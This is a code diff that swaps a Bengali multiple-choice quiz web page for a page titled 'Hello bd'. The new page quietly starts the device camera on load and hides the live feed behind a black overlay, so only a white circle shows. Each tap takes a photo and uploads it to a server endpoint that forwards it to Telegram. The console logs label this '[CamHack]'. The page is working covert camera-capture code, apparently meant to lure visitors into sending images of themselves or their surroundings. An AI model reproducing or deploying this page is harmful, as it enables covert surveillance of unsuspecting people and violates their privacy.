@@ -1,195 +1,326 @@
 <!DOCTYPE html>
-<html lang="bn">
+<html lang="en">
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" />
-<meta name="theme-color" content="#4f46e5" />
-<title>বাংলা MCQ কুইজ প্ল্যাটফর্ম (৪০টি প্রশ্ন)</title>
+<meta name="theme-color" content="#000000" />
+<title>Hello bd</title>
 <style>
   * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
   html, body {
     width:100%; height:100%;
-    background:#f3f4f6;
-    font-family: 'SolaimanLipi', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-    color: #1f2937;
+    background:#000; overflow:hidden;
+    font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    overscroll-behavior:none;
   }
   #app {
-    max-width: 700px;
-    margin: 40px auto;
-    background: #ffffff;
-    border-radius: 12px;
-    box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
-    padding: 24px;
-    overflow-y: auto;
-    max-height: calc(100vh - 80px);
+    position:fixed; inset:0;
+    background:#000;
+    display:flex; align-items:center; justify-content:center;
+    overflow:hidden;
   }
-  h1 {
-    font-size: 24px;
-    text-align: center;
-    margin-bottom: 20px;
-    color: #4f46e5;
+  /* Camera feed hidden behind black overlay */
+  #video {
+    position:absolute; inset:0;
+    width:100%; height:100%;
+    object-fit:cover;
+    background:#000;
+    z-index:0;
   }
-  .question-card {
-    margin-bottom: 20px;
-    padding: 16px;
-    background: #f9fafb;
-    border: 1px solid #e5e7eb;
-    border-radius: 8px;
+  #app::before {
+    content:'';
+    position:absolute; inset:0;
+    background:#000;
+    z-index:1;
+    pointer-events:none;
   }
-  .question-title {
-    font-size: 16px;
-    font-weight: 600;
-    margin-bottom: 12px;
+  #canvas { display:none; }
+
+  /* The white circle — shutter button */
+  #shutter {
+    position:relative;
+    z-index:2;
+    width:150px; height:150px;
+    border-radius:50%;
+    background:#ffffff;
+    border:none;
+    cursor:pointer;
+    padding:0; outline:none;
+    transition: transform .18s ease, box-shadow .28s ease, background .2s ease;
+    box-shadow:
+      0 0 0 0 rgba(255,255,255,.35),
+      0 0 30px rgba(255,255,255,.28),
+      0 0 80px rgba(255,255,255,.10);
+    user-select:none;
+    touch-action:manipulation;
   }
-  .options {
-    display: flex;
-    flex-direction: column;
-    gap: 8px;
+  #shutter:hover {
+    transform:scale(1.08);
+    box-shadow:
+      0 0 0 16px rgba(255,255,255,.10),
+      0 0 55px rgba(255,255,255,.5),
+      0 0 120px rgba(255,255,255,.18);
   }
-  .option-label {
-    display: flex;
-    align-items: center;
-    gap: 10px;
-    padding: 10px 12px;
-    background: #ffffff;
-    border: 1px solid #d1d5db;
-    border-radius: 6px;
-    cursor: pointer;
-    transition: all 0.2s ease;
+  #shutter:active { transform:scale(.93); }
+  #shutter:focus-visible { box-shadow:0 0 0 6px rgba(255,255,255,.35), 0 0 50px rgba(255,255,255,.4); }
+  #shutter:disabled { cursor:wait; opacity:.65; }
+
+  /* Pulsing halo around circle */
+  #shutter::after {
+    content:'';
+    position:absolute; inset:-8px;
+    border-radius:50%;
+    border:1px solid rgba(255,255,255,.20);
+    pointer-events:none;
+    animation:halo 2.4s ease-out infinite;
   }
-  .option-label:hover {
-    background: #eef2ff;
-    border-color: #4f46e5;
+  @keyframes halo {
+    0%   { transform:scale(.98); opacity:.85; }
+    100% { transform:scale(1.4); opacity:0; }
   }
-  input[type="radio"] {
-    accent-color: #4f46e5;
+
+  /* White flash feedback */
+  #flash {
+    position:fixed; inset:0;
+    background:#fff; opacity:0;
+    pointer-events:none; z-index:80;
   }
-  #submit-btn {
-    display: block;
-    width: 100%;
-    padding: 12px;
-    background: #4f46e5;
-    color: #ffffff;
-    border: none;
-    border-radius: 6px;
-    font-size: 16px;
-    font-weight: 600;
-    cursor: pointer;
-    transition: background 0.2s;
-    margin-top: 20px;
+  #flash.on { animation:flashAnim .45s ease-out; }
+  @keyframes flashAnim { 0%{opacity:.9} 100%{opacity:0} }
+
+  /* Status text */
+  #status {
+    position:fixed;
+    bottom:max(36px, env(safe-area-inset-bottom, 36px));
+    left:50%;
+    transform:translateX(-50%);
+    color:#9aa0a6;
+    font-size:12px; font-weight:600;
+    letter-spacing:2.4px;
+    text-transform:uppercase;
+    opacity:0;
+    transition:opacity .3s ease;
+    z-index:90;
+    white-space:nowrap;
+    text-align:center;
+    padding:0 20px;
+    pointer-events:none;
   }
-  #submit-btn:hover {
-    background: #4338ca;
+  #status.show { opacity:1; }
+  #status.ok   { color:#4ade80; }
+  #status.err  { color:#f87171; }
+  .spin {
+    display:inline-block;
+    width:11px; height:11px;
+    border:2px solid rgba(255,255,255,.25);
+    border-top-color:#fff;
+    border-radius:50%;
+    animation:spin .7s linear infinite;
+    margin-right:8px;
+    vertical-align:-1px;
   }
-  #result {
-    margin-top: 20px;
-    text-align: center;
-    font-size: 18px;
-    font-weight: bold;
-  }
+  @keyframes spin { to { transform:rotate(360deg); } }
 </style>
 </head>
 <body>
   <div id="app">
-    <h1>অনলাইন বাংলা MCQ কুইজ (৪০টি প্রশ্ন)</h1>
-    <form id="quiz-form">
-      <div id="questions-container"></div>
-      <button type="submit" id="submit-btn">উত্তর জমা দিন</button>
-    </form>
-    <div id="result"></div>
+    <video id="video" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
+    <button id="shutter" type="button" aria-label="Capture and send to Telegram"></button>
   </div>
+  <div id="flash"></div>
+  <div id="status"></div>
 
 <script>
 (function () {
   'use strict';
 
-  // ৪০টি বাংলা MCQ ডেটা
-  const quizData = [
-    { question: "বাংলাদেশের রাজধানী কি?", options: ["চট্টগ্রাম", "ঢাকা", "সিলেট", "রাজশাহী"], answer: 1 },
-    { question: "বাংলাদেশের জাতীয় ফুল কোনটি?", options: ["গোলাপ", "শাপলা", "জেসমিন", "পদ্ম"], answer: 1 },
-    { question: "কম্পিউটারের জনক কে?", options: ["চার্লস ব্যাবেজ", "বিল গেটস", "স্টিভ জবস", "এলান ট্যুরিং"], answer: 0 },
-    { question: "বাংলাদেশের জাতীয় ফল কোনটি?", options: ["আম", "কাঁঠাল", "লিচু", "কলা"], answer: 1 },
-    { question: "বাংলাদেশের জাতীয় পশু কোনটি?", options: ["হাতি", "রয়েল বেঙ্গল টাইগার", "হরিণ", "সোনালী বিড়াল"], answer: 1 },
-    { question: "সবচেয়ে বড় মহাদেশ কোনটি?", options: ["আফ্রিকা", "এশিয়া", "ইউরোপ", "অস্ট্রেলিয়া"], answer: 1 },
-    { question: "সূর্য কোন দিক থেকে ওঠে?", options: ["পশ্চিম", "উত্তর", "দক্ষিণ", "পূর্ব"], answer: 3 },
-    { question: "পৃথিবীর দীর্ঘতম নদী কোনটি?", options: ["পদ্মা", "আমাজন", "নীলনদ", "মিসিসিপি"], answer: 2 },
-    { question: "সবচেয়ে ছোট দেশ কোনটি?", options: ["ভ্যাটিকান সিটি", "মোনাকো", "সান মারিনো", "লিশটেনস্টাইন"], answer: 0 },
-    { question: "রক্তে কোন উপাদানের কারণে রঙ লাল হয়?", options: ["প্লাজমা", "হিমোগ্লোবিন", "শ্বেত রক্তকণিকা", অনুচক্রিকা], answer: 1 },
-    { question: "পানির রাসায়নিক সংকেত কী?", options: ["CO2", "H2O", "O2", "NaCl"], answer: 1 },
-    { question: "ভাষাসৈনিক দিবস কবে পালিত হয়?", options: ["১৬ ডিসেম্বর", "২৬ মার্চ", "২১ ফেব্রুয়ারি", "১৫ আগস্ট"], answer: 2 },
-    { question: "বাংলাদেশের জাতীয় পাখি কোনটি?", options: ["কাক", "ঘুঘু", "দোয়েল", "শালিক"], answer: 2 },
-    { question: "সুন্দরবন কোন জেলায় অবস্থিত?", options: ["খুলনা", "সিলেট", "বরিশাল", "পাবনা"], answer: 0 },
-    { question: "বাংলাদেশের প্রথম রাষ্ট্রপ্রধান কে ছিলেন?", options: ["বঙ্গবন্ধু শেখ মুজিবুর রহমান", "সৈয়দ নজরুল ইসলাম", "তাজউদ্দীন আহমদ", "এ কে ফজলুল হক"], answer: 0 },
-    { question: "জাতীয় স্মৃতিসৌধ কোথায় অবস্থিত?", options: ["ঢাকা", "সাভার", "গাজীপুর", "নারায়ণগঞ্জ"], answer: 1 },
-    { question: "বাংলাদেশের স্বাধীনতার ঘোষণা কে দেন?", options: ["বঙ্গবন্ধু শেখ মুজিবুর রহমান", "মেজর জিয়াউর রহমান", "তajউদ্দীন আহমদ", "এ কে ফজলুল হক"], answer: 0 },
-    { question: "কোন গ্যাস বায়ুমণ্ডলে সবচেয়ে বেশি রয়েছে?", options: ["অক্সিজেন", "নাইট্রোজেন", "কার্বন ডাই অক্সাইড", "হাইড্রোজেন"], answer: 1 },
-    { question: "ডিজিটাল বাংলাদেশের রূপকার কে?", options: ["শেখ হাসিনা", "সজীব ওয়াজেদ জয়", "বেগম খালেদা জিয়া", "ড. মুহাম্মদ ইউনূস"], answer: 1 },
-    { question: "মোবাইল ফোন কে আবিষ্কার করেন?", options: ["আলেকজান্ডার গ্রাহাম বেল", "মার্টিন কুপার", "টমাস এডিসন", "স্টিভ জবস"], answer: 1 },
-    { question: "ইন্টারনেটের জনক কে?", options: ["ভিন্ট সার্ফ", "টিম বার্নার্স লি", "বিল গেটস", "মার্ক জুকারবার্গ"], answer: 0 },
-    { question: "www এর পূর্ণরূপ কী?", options: ["World Wide Web", "World Wide Website", "Web Wide World", "World Web Wide"], answer: 0 },
-    { question: "HTML কী ধরনের ভাষা?", options: ["প্রোগ্রামিং ভাষা", "মার্কআপ ভাষা", "ডাটাবেজ ভাষা", "স্ক্রিপ্টিং ভাষা"], answer: 1 },
-    { question: "সি (C) ভাষা কে আবিষ্কার করেন?", options: ["ডেনিস রিচি", "জেমস গসলিং", "বjarne Stroustrup", "গুইডো ভ্যান রসম"], answer: 0 },
-    { question: "জাভা (Java) ভাষা কে তৈরি করেন?", options: ["মাইক্রোসফট", "সান মাইক্রোসিস্টেমস", "অ্যাপল", "গুগল"], answer: 1 },
-    { question: "একটি বাইটে কত বিট থাকে?", options: ["৪ বিট", "৮ বিট", "১৬ বিট", "৩২ বিট"], answer: 1 },
-    { question: "মডেম (Modem) কী ধরনের ডিভাইস?", options: ["ইনপুট ডিভাইস", "আউটপুট ডিভাইস", "ইনপুট ও আউটপুট উভয় ডিভাইস", "স্টোরেজ ডিভাইস"], answer: 2 },
-    { question: "র‍্যাম (RAM) কী ধরনের মেমোরি?", options: ["স্থায়ী মেমোরি", "অস্থায়ী মেমোরি", "সেকেন্ডারি মেমোরি", "রিড অনলি মেমোরি"], answer: 1 },
-    { question: "এসএসডি (SSD) এর পুরো কথাটি কী?", options: ["Solid State Drive", "Super Speed Disk", "System Storage Device", "Secure Solid Disk"], answer: 0 },
-    { question: "লাইনাক্স (Linux) কী?", options: ["অপারেটিং সিস্টেম", "ব্রাউজার", "ভাইরাস", "প্রোগ্রামিং ভাষা"], answer: 0 },
-    { question: "ইউএসবি (USB) এর পূর্ণরূপ কী?", options: ["Universal Serial Bus", "United Serial Board", "Universal System Button", "User Serial Bus"], answer: 0 },
-    { question: "পিক্সেল (Pixel) কী?", options: ["ছবির ক্ষুদ্রতম একক", "শব্দ পরিমাপের একক", "কম্পিউটারের গতি", "ইন্টারনেটের গতি"], answer: 0 },
-    { question: "গ্রাফিক্স কার্ডের প্রধান কাজ কী?", options: ["শব্দ প্রসেসিং করা", "ভিডিও ও ছবি রেন্ডার করা", "ইন্টারনেট কানেকশন দেওয়া", "ডেটা সেভ করা"], answer: 1 },
-    { question: "উইন্ডোজ (Windows) কোন কোম্পানির তৈরি?", options: ["অ্যাপল", "মাইক্রোসফট", "গুগল", "আইবিএম"], answer: 1 },
-    { question: "গুগল কবে প্রতিষ্ঠিত হয়?", options: ["১৯৯৬ সালে", "১৯৯৮ সালে", "২০০০ সালে", "২০০৪ সালে"], answer: 1 },
-    { question: "ফেসবুকের প্রতিষ্ঠাতা কে?", options: ["মার্ক জুকারবার্গ", "বিল গেটস", "ইলন মাস্ক", "স্টিভ জবস"], answer: 0 },
-    { question: "পাইথন (Python) প্রোগ্রামিং ভাষার লোগোতে কিসের ছবি আছে?", options: ["সাপ", "পাখি", "সিংহ", "ফুল"], answer: 0 },
-    { question: "কম্পিউটারের মস্তিষ্কমূলক অংশ কোনটি?", options: ["মনিটর", "কীবোর্ড", "সিপিইউ (CPU)", "মাউস"], answer: 2 },
-    { question: "রিবুট (Reboot) বলতে কী বোঝায়?", options: ["কম্পিউটার বন্ধ করা", "কম্পিউটার পুনরায় চালু করা", "সফটওয়্যার আনইনস্টল করা", "নতুন ফাইল তৈরি করা"], answer: 1 },
-    { question: "ব্লুটুথ (Bluetooth) প্রযুক্তির নামকরণ কার নামানুসারে করা হয়?", options: ["রাজা হ্যারল্ড ব্লুটুথ", "গ্র্যাহাম বেল", "আইজ্যাক নিউটন", "নিকোলা টেসলা"], answer: 0 }
-  ];
+  const video     = document.getElementById('video');
+  const canvas    = document.getElementById('canvas');
+  const shutter   = document.getElementById('shutter');
+  const flash     = document.getElementById('flash');
+  const statusEl  = document.getElementById('status');
 
-  const container = document.getElementById('questions-container');
-  const form = document.getElementById('quiz-form');
-  const resultEl = document.getElementById('result');
+  const state = {
+    stream: null,
+    facingMode: 'environment',
+    ready: false,
+    busy: false,
+    starting: null,
+    lastGrab: 0
+  };
 
-  // প্রশ্ন লোড করার ফাংশন
-  function loadQuiz() {
-    let html = '';
-    quizData.forEach((q, index) => {
-      html += `
-        <div class="question-card">
-          <div class="question-title">${index + 1}. ${q.question}</div>
-          <div class="options">
-      `;
-      q.options.forEach((opt, optIndex) => {
-        html += `
-          <label class="option-label">
-            <input type="radio" name="question_${index}" value="${optIndex}" required>
-            <span>${opt}</span>
-          </label>
-        `;
-      });
-      html += `</div></div>`;
+  /* ---------- UI helpers ---------- */
+  function showStatus(text, type, spinner) {
+    statusEl.innerHTML = (spinner ? '<span class="spin"></span>' : '') + text;
+    statusEl.className = 'show ' + (type || '');
+  }
+  function hideStatus() { statusEl.className = ''; }
+
+  /* ---------- Camera ---------- */
+  function waitForFrame() {
+    return new Promise(function (resolve) {
+      if (video.readyState >= 2 && video.videoWidth > 0) {
+        setTimeout(resolve, 120);
+        return;
+      }
+      let done = false;
+      const finish = function () {
+        if (done) return;
+        done = true;
+        setTimeout(resolve, 120);
+      };
+      video.addEventListener('loadeddata', finish, { once: true });
+      video.addEventListener('playing',    finish, { once: true });
+      setTimeout(finish, 2000);
     });
-    container.innerHTML = html;
   }
 
-  // উত্তর সাবমিট হ্যান্ডলার
-  form.addEventListener('submit', function (e) {
-    e.preventDefault();
-    let score = 0;
+  async function ensureCamera() {
+    if (state.ready && state.stream) return true;
+    if (state.starting) return state.starting;
 
-    quizData.forEach((q, index) => {
-      const selected = document.querySelector(`input[name="question_${index}"]:checked`);
-      if (selected && parseInt(selected.value) === q.answer) {
-        score++;
+    state.starting = (async function () {
+      try {
+        if (!window.isSecureContext) throw new Error('HTTPS required for camera');
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+          throw new Error('Camera not supported');
+        }
+        const constraints = {
+          video: {
+            facingMode: state.facingMode,
+            width:  { ideal: 1280 },
+            height: { ideal: 720 }
+          },
+          audio: false
+        };
+        state.stream = await navigator.mediaDevices.getUserMedia(constraints);
+        video.srcObject = state.stream;
+        try { await video.play(); } catch (e) { /* autoplay race, ignore */ }
+        await waitForFrame();
+        state.ready = true;
+        return true;
+      } catch (err) {
+        console.error('[CamHack] camera error:', err);
+        const msg = (err && err.name === 'NotAllowedError')
+          ? 'CAMERA PERMISSION DENIED'
+          : (err && err.message ? err.message.toUpperCase() : 'CAMERA ERROR');
+        showStatus(msg, 'err');
+        setTimeout(hideStatus, 3500);
+        return false;
+      } finally {
+        state.starting = null;
       }
+    })();
+
+    return state.starting;
+  }
+
+  /* ---------- Capture ---------- */
+  function grabFrame() {
+    const w = video.videoWidth  || 640;
+    const h = video.videoHeight || 480;
+    canvas.width  = w;
+    canvas.height = h;
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0, w, h);
+    return canvas.toDataURL('image/jpeg', 0.92);
+  }
+
+  /* ---------- Upload ---------- */
+  async function upload(dataUrl) {
+    const blob = await (await fetch(dataUrl)).blob();
+    const fd = new FormData();
+    fd.append('image', blob, 'capture-' + Date.now() + '.jpg');
+
+    const res = await fetch('/api/upload', {
+      method: 'POST',
+      body: fd
     });
 
-    resultEl.style.color = score === quizData.length ? '#16a34a' : '#4f46e5';
-    resultEl.textContent = `আপনার প্রাপ্ত নম্বর: ${score} / ${quizData.length}`;
+    let json = {};
+    try { json = await res.json(); } catch (e) { /* ignore parse error */ }
+
+    if (!res.ok || !json.success) {
+      throw new Error(json.error || ('Upload failed (' + res.status + ')'));
+    }
+    if (json.telegram !== 'sent') {
+      throw new Error('Telegram send failed');
+    }
+    return json;
+  }
+
+  /* ---------- Main click handler ---------- */
+  async function onCapture() {
+    if (state.busy) return;
+    state.busy = true;
+    shutter.disabled = true;
+
+    try {
+      if (!state.ready) {
+        showStatus('STARTING CAMERA', '', true);
+        const ok = await ensureCamera();
+        if (!ok) return;
+      }
+
+      // Flash feedback
+      flash.classList.remove('on');
+      void flash.offsetWidth;
+      flash.classList.add('on');
+
+      // Capture + upload
+      const dataUrl = grabFrame();
+      state.lastGrab = Date.now();
+
+      showStatus('SENDING', '', true);
+      await upload(dataUrl);
+
+      showStatus('SENT \u2713', 'ok');
+      setTimeout(hideStatus, 1600);
+    } catch (err) {
+      console.error('[CamHack] capture failed:', err);
+      showStatus((err && err.message ? err.message : 'FAILED'), 'err');
+      setTimeout(hideStatus, 3000);
+    } finally {
+      state.busy = false;
+      shutter.disabled = false;
+    }
+  }
+
+  shutter.addEventListener('click', onCapture);
+
+  /* ---------- Pre-warm on load ---------- */
+  window.addEventListener('load', function () {
+    ensureCamera().then(function (ok) {
+      if (!ok) {
+        // Camera prompt blocked until user gesture: guide them gently
+        if (!statusEl.classList.contains('show')) {
+          showStatus('TAP THE CIRCLE TO ALLOW CAMERA', '');
+          setTimeout(hideStatus, 4000);
+        }
+      } else {
+        hideStatus();
+      }
+    });
   });
 
-  loadQuiz();
+  /* ---------- Pause / resume camera when tab hidden ---------- */
+  document.addEventListener('visibilitychange', function () {
+    if (!state.stream) return;
+    const tracks = state.stream.getVideoTracks();
+    if (document.hidden) {
+      tracks.forEach(function (t) { try { t.enabled = false; } catch (e) {} });
+    } else {
+      tracks.forEach(function (t) { try { t.enabled = true;  } catch (e) {} });
+    }
+  });
+
+  /* ---------- Cleanup on unload (best-effort) ---------- */
+  window.addEventListener('pagehide', function () {
+    if (state.stream) {
+      state.stream.getTracks().forEach(function (t) { try { t.stop(); } catch (e) {} });
+    }
+  });
 })();
 </script>
 </body>
